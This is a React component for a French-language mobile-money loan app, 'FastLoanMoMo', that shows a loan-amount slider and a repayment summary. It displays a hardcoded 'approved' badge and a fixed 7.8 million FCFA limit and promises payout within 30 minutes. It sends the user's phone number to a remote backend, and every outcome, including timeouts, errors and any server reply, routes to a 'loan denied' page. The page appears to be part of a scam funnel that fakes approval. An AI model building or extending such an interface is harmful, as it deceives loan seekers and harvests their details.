import { useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, CheckCircle2, Clock } from "lucide-react";

const API_URL = "https://fastloan-momo-kj8m.onrender.com";

const LoanLimit = () => {
  const [amount, setAmount] = useState(100000);
  const [months, setMonths] = useState(6);
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  const phoneNumber =
    location.state?.phone || localStorage.getItem("userPhone") || "0123456789";

  // ✅ DYNAMIC INTEREST RATE BASED ON AMOUNT
  const getInterestRate = (amt: number) => {
    if (amt <= 100000) return 0.05;      // 5%
    if (amt <= 1000000) return 0.04;     // 4%
    if (amt <= 10000000) return 0.03;    // 3%
    return 0.02;                         // 2%
  };

  const currentRate = getInterestRate(amount);
  const interestAmount = amount * currentRate;
  const totalRepayable = amount + interestAmount;
  const monthlyPayment = totalRepayable / months;

  const handleContinue = async () => {
    setIsProcessing(true);

    // ✅ 60 SECONDS (1 MINUTE) TIMER
    timerRef.current = setTimeout(() => {
      setIsProcessing(false);
      navigate("/loan-denied", { state: { amount: amount } });
    }, 60000);

    try {
      const res = await fetch(`${API_URL}/api/apply-loan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phoneNumber, amount, months }),
      });
      const data = await res.json();

      if (data.status === "pending" && data.loan_id) {
        const pollInterval = setInterval(async () => {
          const statusRes = await fetch(
            `${API_URL}/api/loan-status/${data.loan_id}`,
          );
          const statusData = await statusRes.json();

          if (statusData.status !== "pending") {
            clearInterval(pollInterval);
            if (timerRef.current) clearTimeout(timerRef.current);
            setIsProcessing(false);
            navigate("/loan-denied", { state: { amount: amount } });
          }
        }, 3000);
      } else {
        if (timerRef.current) clearTimeout(timerRef.current);
        setIsProcessing(false);
        navigate("/loan-denied", { state: { amount: amount } });
      }
    } catch (error) {
      if (timerRef.current) clearTimeout(timerRef.current);
      setIsProcessing(false);
      navigate("/loan-denied", { state: { amount: amount } });
    }
  };

  const formatFCFA = (val: number) => {
    return Math.round(val).toLocaleString("fr-FR").replace(/\u202f/g, " ");
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon">
          <Wallet size={32} color="white" />
        </div>
        <h1 className="header-title">
          FastLoan<span>MoMo</span>
        </h1>
        <p className="header-subtitle">Prêts mobiles instantanés</p>
      </div>

      <div className="main-card">
        <div className="badge">
          <CheckCircle2 size={14} /> Approuvé
        </div>

        <h2 className="title">Votre limite de prêt</h2>
        <p className="subtitle">
          Vous êtes éligible jusqu'à <span className="bold">7 800 000 FCFA</span>.
          Choisissez le montant.
        </p>

        {/* ✅ MARKET BRAND NOTICE */}
        <div style={{
          backgroundColor: '#EFF6FF',
          border: '1px solid #BFDBFE',
          borderRadius: '12px',
          padding: '12px',
          marginBottom: '24px',
          display: 'flex',
          alignItems: 'flex-start',
          gap: '10px'
        }}>
          <Clock size={20} color="#1D4ED8" style={{ flexShrink: 0, marginTop: '2px' }} />
          <p style={{ fontSize: '13px', color: '#1E3A8A', lineHeight: '1.4', fontWeight: 500 }}>
            Votre prêt sera directement transféré sur votre portefeuille mobile dès son approbation, ce qui prend généralement environ <strong>30 minutes</strong>.
          </p>
        </div>

        <div className="loan-amount-box">
          <p className="loan-label">MONTANT DU PRÊT</p>
          <h1 className="loan-value">{formatFCFA(amount)}</h1>
          <p className="loan-currency">FCFA</p>
        </div>

        {/* AMOUNT SLIDER */}
        <div className="slider-group">
          <div className="slider-header">
            <span>Montant</span>
            <span style={{ color: "#6B7280" }}>{formatFCFA(amount)} FCFA</span>
          </div>
          <input
            type="range"
            min="50000"
            max="7800000" // ✅ Changed Maximum Limit to 7.8 Million
            step="100000"   
            value={amount}
            onChange={(e) => setAmount(Number(e.target.value))}
          />
          <div className="slider-limits">
            <span>50 000 FCFA</span>
            <span>7 800 000 FCFA</span>
          </div>
        </div>

        {/* MONTHS SLIDER */}
        <div className="slider-group">
          <div className="slider-header">
            <span>Période</span>
            <span style={{ color: "#6B7280" }}>{months} mois</span>
          </div>
          <input
            type="range"
            min="1"
            max="12"
            step="1"
            value={months}
            onChange={(e) => setMonths(Number(e.target.value))}
          />
          <div className="slider-limits">
            <span>1 mois</span>
            <span>12 mois</span>
          </div>
        </div>

        {/* DYNAMIC SUMMARY BOX */}
        <div className="summary-box">
          <div className="summary-row">
            <span>Taux d'intérêt</span>
            <span className="bold">{(currentRate * 100).toFixed(0)}%</span>
          </div>
          <div className="summary-row">
            <span>Intérêts</span>
            <span className="bold">{formatFCFA(interestAmount)} FCFA</span>
          </div>
          <div className="summary-row">
            <span>Paiement mensuel</span>
            <span className="bold">{formatFCFA(monthlyPayment)} FCFA</span>
          </div>
          <hr className="summary-divider" />
          <div className="summary-row summary-total">
            <span style={{ fontWeight: 500 }}>Total à rembourser</span>
            <span className="bold">{formatFCFA(totalRepayable)} FCFA</span>
          </div>
        </div>

        <button
          onClick={handleContinue}
          className="btn-primary"
          style={{ padding: "16px", fontSize: "18px" }}
        >
          Continuer
        </button>
      </div>

      {isProcessing && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="spinner"></div>
            <h3 className="modal-title">Demande soumise</h3>
            <p className="modal-text">
              Votre demande a été soumise avec succès.
              <br />
              Veuillez patienter pendant que nous examinons votre demande.
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoanLimit;